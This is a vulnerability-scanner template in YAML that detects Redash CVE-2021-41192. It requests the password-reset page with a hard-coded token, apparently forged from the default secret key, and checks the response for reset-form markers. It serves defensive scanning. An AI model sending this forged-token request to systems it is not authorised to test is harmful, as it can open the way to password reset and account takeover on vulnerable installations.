name: yaml-poc-redash-redash-other-CVE-2021-41192
binding: 0b96d6b9-b382-4294-a2eb-f444277de81a
detail:
    author: system_user
    links:
        - https://github.com/getredash/redash/commit/ce60d20c4e3d1537581f2f70f1308fe77ab6a214
        - https://github.com/getredash/redash/security/advisories/GHSA-g8xr-f424-h2rv
        - https://ian.sh/redash
        - https://nvd.nist.gov/vuln/detail/CVE-2021-41192
    vulnerability:
        id: b2c8dc15-c0aa-4b39-8f1d-64c9533aa91f
        level: medium
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs
        expression: |
            response.status == 200 && response.headers["Referrer-Policy"].contains("strict-origin-when-cross-origin") && response.body.bcontains(bytes("Enter your new password:")) && response.body.bcontains(bytes("Change my password")) && "<img src=\"/static/images/redash_icon_small.png\">".bmatches(response.body)
expression: r0()
